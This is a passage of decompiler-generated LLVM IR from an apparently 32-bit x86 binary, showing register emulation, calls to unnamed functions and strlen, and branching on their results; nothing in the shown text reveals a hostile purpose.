  %v1_804ad93 = add i32 %v0_804ad93, 12
  %v2_804ad93 = inttoptr i32 %v1_804ad93 to i32*
  store i32 0, i32* %v2_804ad93, align 4
  %v0_804ad9b = load i32, i32* @esp, align 4
  %v1_804ad9b = add i32 %v0_804ad9b, 8
  %v2_804ad9b = inttoptr i32 %v1_804ad9b to i32*
  store i32 1, i32* %v2_804ad9b, align 4
  %v0_804ada3 = load i32, i32* @esp, align 4
  %v1_804ada3 = add i32 %v0_804ada3, 4
  %v2_804ada3 = inttoptr i32 %v1_804ada3 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e78.34 to i32), i32* %v2_804ada3, align 4
  %v0_804adab = load i32, i32* %eax.global-to-local, align 4
  %v1_804adab = load i32, i32* @esp, align 4
  %v2_804adab = inttoptr i32 %v1_804adab to i32*
  store i32 %v0_804adab, i32* %v2_804adab, align 4
  %v0_804adae = call i32 @function_80499cb()
  %v1_804adb3 = icmp eq i32 %v0_804adae, 0
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804ad0b, i32* %eax.global-to-local, align 4
  br i1 %v1_804adb3, label %dec_label_pc_804ae78, label %dec_label_pc_804adbb

dec_label_pc_804adbb:                             ; preds = %dec_label_pc_804ad3a
  store i32 0, i32* %v1_804ad10, align 4
  store i16 0, i16* %v1_804ad4e, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ae02 = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ae02, i32* %eax.global-to-local, align 4
  %v0_804ae04 = load i32, i32* @esp, align 4
  %v1_804ae04 = add i32 %v0_804ae04, 4
  %v2_804ae04 = inttoptr i32 %v1_804ae04 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e78.34 to i32), i32* %v2_804ae04, align 4
  %v0_804ae0c = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae0c = load i32, i32* @esp, align 4
  %v2_804ae0c = inttoptr i32 %v1_804ae0c to i32*
  store i32 %v0_804ae0c, i32* %v2_804ae0c, align 4
  %v2_804ae0f = inttoptr i32 %stack_var_-224.215 to i8*
  %v3_804ae0f = call i32 @function_804f744(i32 %stack_var_-228.217, i8* %v2_804ae0f)
  %v1_804ae14 = icmp eq i32 %v3_804ae0f, 0
  %. = select i1 %v1_804ae14, i8 7, i8 5
  store i8 %., i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ae56 = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ae56, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804ae5f = load i32, i32* @esp, align 4
  %v2_804ae5f = add i32 %v1_804ae5f, 8
  %v3_804ae5f = inttoptr i32 %v2_804ae5f to i32*
  store i32 1024, i32* %v3_804ae5f, align 4
  %v0_804ae63 = load i32, i32* @esp, align 4
  %v1_804ae63 = add i32 %v0_804ae63, 4
  %v2_804ae63 = inttoptr i32 %v1_804ae63 to i32*
  store i32 0, i32* %v2_804ae63, align 4
  %v0_804ae6b = load i32, i32* %edx.global-to-local, align 4
  %v1_804ae6b = load i32, i32* @esp, align 4
  %v2_804ae6b = inttoptr i32 %v1_804ae6b to i32*
  store i32 %v0_804ae6b, i32* %v2_804ae6b, align 4
  %v3_804ae6e = inttoptr i32 %stack_var_-228.217 to i8*
  %v4_804ae6e = call i32 @function_804f698(i8* %v3_804ae6e, i32 %stack_var_-224.215, i32 %.v2_804a1b4)
  store i32 %v4_804ae6e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804ae78:                             ; preds = %dec_label_pc_804ad3a
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804ae8c = load i32, i32* %v1_804ad67, align 4
  store i32 %v2_804ae8c, i32* %eax.global-to-local, align 4
  %v0_804ae8e = load i32, i32* @esp, align 4
  %v1_804ae8e = add i32 %v0_804ae8e, 4
  %v2_804ae8e = inttoptr i32 %v1_804ae8e to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e81.35 to i32), i32* %v2_804ae8e, align 4
  %v0_804ae96 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae96 = load i32, i32* @esp, align 4
  %v2_804ae96 = inttoptr i32 %v1_804ae96 to i32*
  store i32 %v0_804ae96, i32* %v2_804ae96, align 4
  %v2_804ae99 = inttoptr i32 %stack_var_-224.215 to i8*
  %v3_804ae99 = call i32 @function_804f744(i32 %stack_var_-228.217, i8* %v2_804ae99)
  store i32 %v3_804ae99, i32* %eax.global-to-local, align 4
  %v1_804ae9e = icmp eq i32 %v3_804ae99, 0
  br i1 %v1_804ae9e, label %dec_label_pc_804aee9, label %dec_label_pc_804aea2

dec_label_pc_804aea2:                             ; preds = %dec_label_pc_804ae78
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804aeb1 = load i32, i32* %v3_804ad78, align 8
  store i32 %v4_804aeb1, i32* %eax.global-to-local, align 4
  %v1_804aeb4 = load i32, i32* @esp, align 4
  %v2_804aeb4 = inttoptr i32 %v1_804aeb4 to i32*
  store i32 %v4_804aeb1, i32* %v2_804aeb4, align 4
  %v1_804aeb7 = call i32 @function_804a162(i32 %stack_var_-228.217)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804aedf = add i32 %v2_804a289, %v2_804a306
  %v4_804aedf = inttoptr i32 %v3_804aedf to i8*
  store i8 0, i8* %v4_804aedf, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804aee9:                             ; preds = %dec_label_pc_804ae78
  store i32 %v1_804a425, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad64, i32* %eax.global-to-local, align 4
  %v2_804af00 = load i32, i32* %v1_804ad67, align 4
  %v1_804af0d = and i32 %v2_804af00, -256
  store i32 %v1_804af0d, i32* %eax.global-to-local, align 4
  %v4_804af10 = inttoptr i32 %v2_804af00 to i8*
  store i32 %v2_804af00, i32* @edi, align 4
  %v3_804af16 = call i32 @_strlen(i8* %v4_804af10)
  %v0_804af23 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804af29 = mul i32 %v0_804af23, 24
  %v1_804af2e = add i32 %v2_804ab1c, %v2_804af29
  %v1_804af31 = trunc i32 %v3_804af16 to i16
  %v3_804af31 = inttoptr i32 %v1_804af2e to i16*
  store i16 %v1_804af31, i16* %v3_804af31, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804ad0d, i32* %eax.global-to-local, align 4
  %v2_804af48 = load i32, i32* %v1_804ad10, align 4
  store i32 %v2_804af48, i32* %eax.global-to-local, align 4
  %v1_804af4a = add i32 %v2_804af48, 30
  store i32 %v1_804af4a, i32* @ebx, align 4
  %v0_804af4d = load i32, i32* @esp, align 4
  %v1_804af4d = inttoptr i32 %v0_804af4d to i32*
  store i32 0, i32* %v1_804af4d, align 4
  %v1_804af54 = inttoptr i32 %v2_804af00 to i32*
  %v2_804af54 = call i32 @function_804e5dc(i32* %v1_804af54)
  store i32 %v2_804af54, i32* %eax.global-to-local, align 4
  %v0_804af59 = load i32, i32* @ebx, align 4
  %v7_804af59 = icmp ult i32 %v0_804af59, %v2_804af54
  %v1_804af5b = icmp eq i1 %v7_804af59, false
  br i1 %v1_804af5b, label %dec_label_pc_804b759, label %dec_label_pc_804af61

dec_label_pc_804af61:                             ; preds = %dec_label_pc_804aee9
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804af70 = load i32, i32* %v3_804ad78, align 8
  store i32 %v4_804af70, i32* %eax.global-to-local, align 4
  %v1_804af73 = load i32, i32* @esp, align 4
  %v2_804af73 = inttoptr i32 %v1_804af73 to i32*
  store i32 %v4_804af70, i32* %v2_804af73, align 4
  %v1_804af76 = call i32 @function_804a162(i32 %v2_804af00)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804af9e = add i32 %v2_804a289, %v2_804a306
  %v4_804af9e = inttoptr i32 %v3_804af9e to i8*
  store i8 1, i8* %v4_804af9e, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804afa8:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804afb7 = add i32 %v2_804a415, %v2_804a306
  %v4_804afb7 = inttoptr i32 %v3_804afb7 to i8*
  %v5_804afb7 = load i8, i8* %v4_804afb7, align 1
  %v6_804afb7 = zext i8 %v5_804afb7 to i32
  store i32 %v6_804afb7, i32* %eax.global-to-local, align 4
  %v1_804afbf = mul nuw nsw i32 %v6_804afb7, 4
  %v2_804afbf = add nuw nsw i32 %v1_804afbf, 134567488
  %v3_804afbf = inttoptr i32 %v2_804afbf to i32*
  %v4_804afbf = load i32, i32* %v3_804afbf, align 4
  %v1_804afd1 = and i32 %v4_804afbf, -256
  store i32 %v1_804afd1, i32* %eax.global-to-local, align 4
  %v4_804afd4 = inttoptr i32 %v4_804afbf to i8*
  store i32 %v4_804afbf, i32* @edi, align 4
  %v3_804afda = call i32 @_strlen(i8* %v4_804afd4)
  store i32 %v3_804afda, i32* @esi, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v5_804aff2 = load i8, i8* %v4_804afb7, align 1
  %v6_804aff2 = zext i8 %v5_804aff2 to i32
  store i32 %v6_804aff2, i32* %eax.global-to-local, align 4
  %v1_804affa = mul nuw nsw i32 %v6_804aff2, 4
  %v2_804affa = add nuw nsw i32 %v1_804affa, 134567488
  %v3_804affa = inttoptr i32 %v2_804affa to i32*
  %v4_804affa = load i32, i32* %v3_804affa, align 4
  store i32 %v4_804affa, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v2_804b010 = add i32 %v2_804a306, %v2_804a245
  %v3_804b010 = inttoptr i32 %v2_804b010 to i32*
  %v4_804b010 = load i32, i32* %v3_804b010, align 8
  store i32 %v4_804b010, i32* %eax.global-to-local, align 4
  %v0_804b013 = load i32, i32* @esp, align 4
  %v1_804b013 = add i32 %v0_804b013, 12
  %v2_804b013 = inttoptr i32 %v1_804b013 to i32*
  store i32 16384, i32* %v2_804b013, align 4
  %v0_804b01b = load i32, i32* @esi, align 4
  %v1_804b01b = load i32, i32* @esp, align 4
  %v2_804b01b = add i32 %v1_804b01b, 8
  %v3_804b01b = inttoptr i32 %v2_804b01b to i32*
  store i32 %v0_804b01b, i32* %v3_804b01b, align 4
  %v0_804b01f = load i32, i32* @ebx, align 4
  %v1_804b01f = load i32, i32* @esp, align 4
  %v2_804b01f = add i32 %v1_804b01f, 4
  %v3_804b01f = inttoptr i32 %v2_804b01f to i32*
  store i32 %v0_804b01f, i32* %v3_804b01f, align 4
  %v0_804b023 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b023 = load i32, i32* @esp, align 4
  %v2_804b023 = inttoptr i32 %v1_804b023 to i32*
  store i32 %v0_804b023, i32* %v2_804b023, align 4
  %v4_804b026 = call i32 @function_804fb14(i32 %v4_804afbf, i32 %stack_var_-232.219, i32 %stack_var_-228.217, i32 %stack_var_-224.215)
  %v2_804b02b = icmp slt i32 %v4_804b026, 0
  %v1_804b02d = icmp eq i1 %v2_804b02b, false
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b085 = load i32, i32* %v3_804b010, align 8
  store i32 %v4_804b085, i32* %eax.global-to-local, align 4
  %v0_804b088 = load i32, i32* @esp, align 4
  br i1 %v1_804b02d, label %dec_label_pc_804b076, label %dec_label_pc_804b02f

dec_label_pc_804b02f:                             ; preds = %dec_label_pc_804afa8
  %v2_804b041 = inttoptr i32 %v0_804b088 to i32*
  store i32 %v4_804b085, i32* %v2_804b041, align 4
  %v1_804b044 = call i32 @function_804a162(i32 %v4_804afbf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b06c = add i32 %v2_804a289, %v2_804a306
  %v4_804b06c = inttoptr i32 %v3_804b06c to i8*
  store i8 1, i8* %v4_804b06c, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b076:                             ; preds = %dec_label_pc_804afa8
  %v1_804b088 = add i32 %v0_804b088, 12
  %v2_804b088 = inttoptr i32 %v1_804b088 to i32*
  store i32 16384, i32* %v2_804b088, align 4
  %v0_804b090 = load i32, i32* @esp, align 4
  %v1_804b090 = add i32 %v0_804b090, 8
  %v2_804b090 = inttoptr i32 %v1_804b090 to i32*
  store i32 2, i32* %v2_804b090, align 4
  %v0_804b098 = load i32, i32* @esp, align 4
  %v1_804b098 = add i32 %v0_804b098, 4
  %v2_804b098 = inttoptr i32 %v1_804b098 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052e75.33 to i32), i32* %v2_804b098, align 4
  %v0_804b0a0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0a0 = load i32, i32* @esp, align 4
  %v2_804b0a0 = inttoptr i32 %v1_804b0a0 to i32*
  store i32 %v0_804b0a0, i32* %v2_804b0a0, align 4
  %v4_804b0a3 = call i32 @function_804fb14(i32 %v4_804afbf, i32 %stack_var_-232.219, i32 %stack_var_-228.217, i32 %stack_var_-224.215)
  %v2_804b0a8 = icmp slt i32 %v4_804b0a3, 0
  %v1_804b0aa = icmp eq i1 %v2_804b0a8, false
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804b0aa, label %dec_label_pc_804b0f3, label %dec_label_pc_804b0ac

dec_label_pc_804b0ac:                             ; preds = %dec_label_pc_804b076
  %v4_804b0bb = load i32, i32* %v3_804b010, align 8
  store i32 %v4_804b0bb, i32* %eax.global-to-local, align 4
  %v1_804b0be = load i32, i32* @esp, align 4
  %v2_804b0be = inttoptr i32 %v1_804b0be to i32*
  store i32 %v4_804b0bb, i32* %v2_804b0be, align 4
  %v1_804b0c1 = call i32 @function_804a162(i32 %v4_804afbf)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b0e9 = add i32 %v2_804a289, %v2_804a306
  %v4_804b0e9 = inttoptr i32 %v3_804b0e9 to i8*
  store i8 1, i8* %v4_804b0e9, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b0f3:                             ; preds = %dec_label_pc_804b076
  store i8 6, i8* %v4_804a309, align 8
  br label %dec_label_pc_804b759

dec_label_pc_804b10c:                             ; preds = %dec_label_pc_804a2fa
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v2_804b11b = add i32 %v2_804a306, %v2_804a245
  %v1_804b11d = add i32 %v2_804b11b, 12
  store i32 %v1_804b11d, i32* %eax.global-to-local, align 4
  %v1_804b120 = inttoptr i32 %v1_804b11d to i32*
  %v2_804b120 = load i32, i32* %v1_804b120, align 4
  store i32 %v2_804b120, i32* %eax.global-to-local, align 4
  %v1_804b122 = icmp eq i32 %v2_804b120, 0
  %v1_804b124 = icmp eq i1 %v1_804b122, false
  br i1 %v1_804b124, label %dec_label_pc_804b14a, label %dec_label_pc_804b126

dec_label_pc_804b126:                             ; preds = %dec_label_pc_804b10c
  store i32 %v1_804a425, i32* @ebx, align 4
  %v0_804b129 = load i32, i32* @esp, align 4
  %v1_804b129 = inttoptr i32 %v0_804b129 to i32*
  store i32 0, i32* %v1_804b129, align 4
  %v1_804b130 = inttoptr i32 %v6_804a309 to i32*
  %v2_804b130 = call i32 @function_804e5dc(i32* %v1_804b130)
  store i32 %v2_804a245, i32* %edx.global-to-local, align 4
  %v0_804b13a = load i32, i32* @ebx, align 4
  %v2_804b140 = mul i32 %v0_804b13a, 24
  %v2_804b143 = add i32 %v2_804b140, %v2_804a245
  %v1_804b145 = add i32 %v2_804b143, 12
  store i32 %v1_804b145, i32* %eax.global-to-local, align 4
  %v2_804b148 = inttoptr i32 %v1_804b145 to i32*
  store i32 %v2_804b130, i32* %v2_804b148, align 4
  br label %dec_label_pc_804b14a

dec_label_pc_804b14a:                             ; preds = %dec_label_pc_804b10c, %dec_label_pc_804b126
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804b15b = add i32 %v2_804b11b, 16
  store i32 %v1_804b15b, i32* %eax.global-to-local, align 4
  %v1_804b15e = inttoptr i32 %v1_804b15b to i16*
  %v2_804b15e = load i16, i16* %v1_804b15e, align 8
  %v3_804b15e = zext i16 %v2_804b15e to i32
  store i32 %v3_804b15e, i32* @esi, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  %v1_804b174 = add i32 %v2_804b11b, 20
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v1_804b177 = inttoptr i32 %v1_804b174 to i32*
  %v2_804b177 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b177, i32* @ebx, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b188 = inttoptr i32 %v2_804b11b to i32*
  %v4_804b188 = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b188, i32* %eax.global-to-local, align 4
  %v1_804b18b = load i32, i32* @esp, align 4
  %v2_804b18b = add i32 %v1_804b18b, 28
  %v3_804b18b = inttoptr i32 %v2_804b18b to i32*
  store i32 %v3_804b15e, i32* %v3_804b18b, align 4
  %v0_804b18f = load i32, i32* @esp, align 4
  %v1_804b18f = add i32 %v0_804b18f, 24
  %v2_804b18f = inttoptr i32 %v1_804b18f to i32*
  store i32 1024, i32* %v2_804b18f, align 4
  %v0_804b197 = load i32, i32* @ebx, align 4
  %v1_804b197 = load i32, i32* @esp, align 4
  %v2_804b197 = add i32 %v1_804b197, 20
  %v3_804b197 = inttoptr i32 %v2_804b197 to i32*
  store i32 %v0_804b197, i32* %v3_804b197, align 4
  %v0_804b19b = load i32, i32* @esp, align 4
  %v1_804b19b = add i32 %v0_804b19b, 16
  %v2_804b19b = inttoptr i32 %v1_804b19b to i32*
  store i32 10000, i32* %v2_804b19b, align 4
  %v0_804b1a3 = load i32, i32* @esp, align 4
  %v1_804b1a3 = add i32 %v0_804b1a3, 12
  %v2_804b1a3 = inttoptr i32 %v1_804b1a3 to i32*
  store i32 0, i32* %v2_804b1a3, align 4
  %v0_804b1ab = load i32, i32* @esp, align 4
  %v1_804b1ab = add i32 %v0_804b1ab, 8
  %v2_804b1ab = inttoptr i32 %v1_804b1ab to i32*
  store i32 1, i32* %v2_804b1ab, align 4
  %v0_804b1b3 = load i32, i32* @esp, align 4
  %v1_804b1b3 = add i32 %v0_804b1b3, 4
  %v2_804b1b3 = inttoptr i32 %v1_804b1b3 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e81.35 to i32), i32* %v2_804b1b3, align 4
  %v0_804b1bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804b1bb = load i32, i32* @esp, align 4
  %v2_804b1bb = inttoptr i32 %v1_804b1bb to i32*
  store i32 %v0_804b1bb, i32* %v2_804b1bb, align 4
  %v0_804b1be = call i32 @function_80499cb()
  store i32 %v0_804b1be, i32* %eax.global-to-local, align 4
  %v1_804b1c3 = icmp eq i32 %v0_804b1be, 0
  br i1 %v1_804b1c3, label %dec_label_pc_804b384, label %dec_label_pc_804b1cb

dec_label_pc_804b1cb:                             ; preds = %dec_label_pc_804b14a
  store i32 0, i32* %v1_804b120, align 4
  store i16 0, i16* %v1_804b15e, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b212 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b212, i32* %eax.global-to-local, align 4
  %v0_804b214 = load i32, i32* @esp, align 4
  %v1_804b214 = add i32 %v0_804b214, 4
  %v2_804b214 = inttoptr i32 %v1_804b214 to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8052e81.35 to i32), i32* %v2_804b214, align 4
  %v0_804b21c = load i32, i32* %eax.global-to-local, align 4
  %v1_804b21c = load i32, i32* @esp, align 4
  %v2_804b21c = inttoptr i32 %v1_804b21c to i32*
  store i32 %v0_804b21c, i32* %v2_804b21c, align 4
  %v2_804b21f = inttoptr i32 %stack_var_-232.219 to i8*
  %v3_804b21f = call i32 @function_804f744(i32 %stack_var_-236.221, i8* %v2_804b21f)
  %v1_804b224 = icmp eq i32 %v3_804b21f, 0
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b2b4 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b2b4, i32* %eax.global-to-local, align 4
  br i1 %v1_804b224, label %dec_label_pc_804b2a0, label %dec_label_pc_804b228

dec_label_pc_804b228:                             ; preds = %dec_label_pc_804b1cb
  store i32 %v2_804b2b4, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b245 = load i32, i32* @esp, align 4
  %v2_804b245 = add i32 %v1_804b245, 8
  %v3_804b245 = inttoptr i32 %v2_804b245 to i32*
  store i32 1024, i32* %v3_804b245, align 4
  %v0_804b249 = load i32, i32* @esp, align 4
  %v1_804b249 = add i32 %v0_804b249, 4
  %v2_804b249 = inttoptr i32 %v1_804b249 to i32*
  store i32 0, i32* %v2_804b249, align 4
  %v0_804b251 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b251 = load i32, i32* @esp, align 4
  %v2_804b251 = inttoptr i32 %v1_804b251 to i32*
  store i32 %v0_804b251, i32* %v2_804b251, align 4
  %v3_804b254 = inttoptr i32 %stack_var_-236.221 to i8*
  %v4_804b254 = call i32 @function_804f698(i8* %v3_804b254, i32 %stack_var_-232.219, i32 %stack_var_-228.217)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b268 = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b268, i32* %eax.global-to-local, align 4
  %v1_804b26b = load i32, i32* @esp, align 4
  %v2_804b26b = inttoptr i32 %v1_804b26b to i32*
  store i32 %v4_804b268, i32* %v2_804b26b, align 4
  %v1_804b26e = call i32 @function_804a162(i32 %stack_var_-236.221)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b296 = add i32 %v2_804a289, %v2_804a306
  %v4_804b296 = inttoptr i32 %v3_804b296 to i8*
  store i8 0, i8* %v4_804b296, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b2a0:                             ; preds = %dec_label_pc_804b1cb
  %v1_804b2b6 = load i32, i32* @esp, align 4
  %v2_804b2b6 = inttoptr i32 %v1_804b2b6 to i32*
  store i32 %v2_804b2b4, i32* %v2_804b2b6, align 4
  %v1_804b2b9 = inttoptr i32 %stack_var_-236.221 to i8*
  %v2_804b2b9 = call i32 @function_80498c4(i8* %v1_804b2b9)
  %v1_804b2be = icmp eq i32 %v2_804b2b9, 0
  %v1_804b2c0 = icmp eq i1 %v1_804b2be, false
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  br i1 %v1_804b2c0, label %dec_label_pc_804b33a, label %dec_label_pc_804b2c2

dec_label_pc_804b2c2:                             ; preds = %dec_label_pc_804b2a0
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b2d6 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b2d6, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b2df = load i32, i32* @esp, align 4
  %v2_804b2df = add i32 %v1_804b2df, 8
  %v3_804b2df = inttoptr i32 %v2_804b2df to i32*
  store i32 1024, i32* %v3_804b2df, align 4
  %v0_804b2e3 = load i32, i32* @esp, align 4
  %v1_804b2e3 = add i32 %v0_804b2e3, 4
  %v2_804b2e3 = inttoptr i32 %v1_804b2e3 to i32*
  store i32 0, i32* %v2_804b2e3, align 4
  %v0_804b2eb = load i32, i32* %edx.global-to-local, align 4
  %v1_804b2eb = load i32, i32* @esp, align 4
  %v2_804b2eb = inttoptr i32 %v1_804b2eb to i32*
  store i32 %v0_804b2eb, i32* %v2_804b2eb, align 4
  %v4_804b2ee = call i32 @function_804f698(i8* %v1_804b2b9, i32 %stack_var_-232.219, i32 %stack_var_-228.217)
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b302 = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b302, i32* %eax.global-to-local, align 4
  %v1_804b305 = load i32, i32* @esp, align 4
  %v2_804b305 = inttoptr i32 %v1_804b305 to i32*
  store i32 %v4_804b302, i32* %v2_804b305, align 4
  %v1_804b308 = call i32 @function_804a162(i32 %stack_var_-236.221)
  store i8 0, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v3_804b330 = add i32 %v2_804a289, %v2_804a306
  %v4_804b330 = inttoptr i32 %v3_804b330 to i8*
  store i8 1, i8* %v4_804b330, align 1
  br label %dec_label_pc_804b759

dec_label_pc_804b33a:                             ; preds = %dec_label_pc_804b2a0
  store i8 7, i8* %v4_804a309, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b362 = load i32, i32* %v1_804b177, align 4
  store i32 %v2_804b362, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v1_804b36b = load i32, i32* @esp, align 4
  %v2_804b36b = add i32 %v1_804b36b, 8
  %v3_804b36b = inttoptr i32 %v2_804b36b to i32*
  store i32 1024, i32* %v3_804b36b, align 4
  %v0_804b36f = load i32, i32* @esp, align 4
  %v1_804b36f = add i32 %v0_804b36f, 4
  %v2_804b36f = inttoptr i32 %v1_804b36f to i32*
  store i32 0, i32* %v2_804b36f, align 4
  %v0_804b377 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b377 = load i32, i32* @esp, align 4
  %v2_804b377 = inttoptr i32 %v1_804b377 to i32*
  store i32 %v0_804b377, i32* %v2_804b377, align 4
  %v4_804b37a = call i32 @function_804f698(i8* %v1_804b2b9, i32 %stack_var_-232.219, i32 %stack_var_-228.217)
  store i32 %v4_804b37a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b759

dec_label_pc_804b384:                             ; preds = %dec_label_pc_804b14a
  store i32 %v1_804a425, i32* %ebx.global-to-local, align 4
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804b174, i32* %eax.global-to-local, align 4
  %v2_804b39b = load i32, i32* %v1_804b177, align 4
  %v1_804b3a8 = and i32 %v2_804b39b, -256
  store i32 %v1_804b3a8, i32* %eax.global-to-local, align 4
  %v4_804b3ab = inttoptr i32 %v2_804b39b to i8*
  store i32 %v2_804b39b, i32* @edi, align 4
  %v3_804b3b1 = call i32 @_strlen(i8* %v4_804b3ab)
  %v0_804b3be = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b3c4 = mul i32 %v0_804b3be, 24
  %v1_804b3c9 = add i32 %v2_804ab1c, %v2_804b3c4
  %v1_804b3cc = trunc i32 %v3_804b3b1 to i16
  %v3_804b3cc = inttoptr i32 %v1_804b3c9 to i16*
  store i16 %v1_804b3cc, i16* %v3_804b3cc, align 8
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v1_804b11d, i32* %eax.global-to-local, align 4
  %v2_804b3e3 = load i32, i32* %v1_804b120, align 4
  store i32 %v2_804b3e3, i32* %eax.global-to-local, align 4
  %v1_804b3e5 = add i32 %v2_804b3e3, 30
  store i32 %v1_804b3e5, i32* @ebx, align 4
  %v0_804b3e8 = load i32, i32* @esp, align 4
  %v1_804b3e8 = inttoptr i32 %v0_804b3e8 to i32*
  store i32 0, i32* %v1_804b3e8, align 4
  %v1_804b3ef = inttoptr i32 %v2_804b39b to i32*
  %v2_804b3ef = call i32 @function_804e5dc(i32* %v1_804b3ef)
  store i32 %v2_804b3ef, i32* %eax.global-to-local, align 4
  %v0_804b3f4 = load i32, i32* @ebx, align 4
  %v7_804b3f4 = icmp ult i32 %v0_804b3f4, %v2_804b3ef
  %v1_804b3f6 = icmp eq i1 %v7_804b3f4, false
  br i1 %v1_804b3f6, label %dec_label_pc_804b759, label %dec_label_pc_804b3fc

dec_label_pc_804b3fc:                             ; preds = %dec_label_pc_804b384
  store i32 %v1_804a425, i32* %edx.global-to-local, align 4
  store i32 %v2_804a306, i32* %eax.global-to-local, align 4
  %v4_804b40b = load i32, i32* %v3_804b188, align 8
  store i32 %v4_804b40b, i32* %eax.global-to-local, align 4
  %v1_804b40e = load i32, i32* @esp, align 4
  %v2_804b40e = inttoptr i32 %v1_804b40e to i32*
